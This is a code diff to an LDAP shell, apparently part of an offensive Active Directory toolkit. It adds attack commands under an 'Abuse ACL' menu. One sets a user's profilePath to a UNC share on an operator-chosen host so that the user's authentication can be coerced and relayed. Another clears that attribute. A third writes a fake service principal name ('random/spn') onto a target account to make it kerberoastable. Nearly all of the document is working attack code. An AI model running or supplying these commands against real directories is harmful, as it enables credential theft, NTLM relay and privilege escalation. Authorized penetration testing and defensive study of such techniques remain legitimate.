@@ -973,6 +973,70 @@ class LdapShell(cmd.Cmd):
                      grantee_name, target_name)
         else:
             self.process_error_response()
+    def do_set_profilePath(self, line):
+        args = shlex.split(line)
+        target_name = args[0]
+        profile_content = args[1]
+        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
+                                     attributes=['objectSid','profilePath'])
+        if not success or len(self.client.entries) != 1:
+            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')
+
+        target = self.client.entries[0]
+        target_sid = target['objectSid'].value
+        userprofilePath = target['profilePath'].value
+        log.info('Found Target DN: %s', target.entry_dn)
+        log.info('Target SID: %s', target_sid)
+        self.client.modify(target.entry_dn,
+                           {'profilePath': [ldap3.MODIFY_REPLACE, ['\\\\'+profile_content+'\\'+'fake']]})
+        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
+                                     attributes=['profilePath'])
+        target = self.client.entries[0]
+        userprofilePath = target['profilePath'].value
+        print('New profilePath:' +userprofilePath)
+
+    def do_unset_profilePath(self, line):
+        args = shlex.split(line)
+        target_name = args[0]
+        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
+                                     attributes=['objectSid','profilePath'])
+        if not success or len(self.client.entries) != 1:
+            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')
+
+        target = self.client.entries[0]
+        target_sid = target['objectSid'].value
+        userprofilePath = target['profilePath'].value
+        log.info('Found Target DN: %s', target.entry_dn)
+        log.info('Target SID: %s', target_sid)
+        self.client.modify(target.entry_dn,
+                           {'profilePath': [ldap3.MODIFY_REPLACE, []]})
+        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
+                                     attributes=['profilePath'])
+        target = self.client.entries[0]
+        userprofilePath = target['profilePath'].value
+        print(userprofilePath)
+
+    def do_set_kerberoast(self, line):
+        args = shlex.split(line)
+        target_name = args[0]
+        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
+                                     attributes=['objectSid','servicePrincipalName'])
+        if not success or len(self.client.entries) != 1:
+            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')
+
+        target = self.client.entries[0]
+        target_sid = target['objectSid'].value
+        userSPN = target['servicePrincipalName'].value
+        log.info('Found Target DN: %s', target.entry_dn)
+        log.info('Target SID: %s', target_sid)
+        self.client.modify(target.entry_dn,
+                           {'servicePrincipalName': [ldap3.MODIFY_REPLACE, ['random/spn']]})
+        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
+                                     attributes=['servicePrincipalName'])
+        target = self.client.entries[0]
+        userSPN = target['servicePrincipalName'].value
+        print('New SPN:' +userSPN)
+
     def do_get_ntlm(self, user):
         #Thx ShutdownRepo
         self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(escape_filter_chars(user)),
@@ -1162,6 +1226,9 @@ Get Info
     get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
     get_maq user - Get ms-DS-MachineAccountQuota for current user.
 Abuse ACL
+    set_profilePath - Modify profilePath target attribute, usefull to relay.
+    unset_profilePath - Clean profilePath (Restore as default).
+    set_kerberoast - Add SPN to perform target kerberoast.
     add_user_to_group user group - Adds a user to a group.
     del_user_from_group user group - Delete a user from a group.
     change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
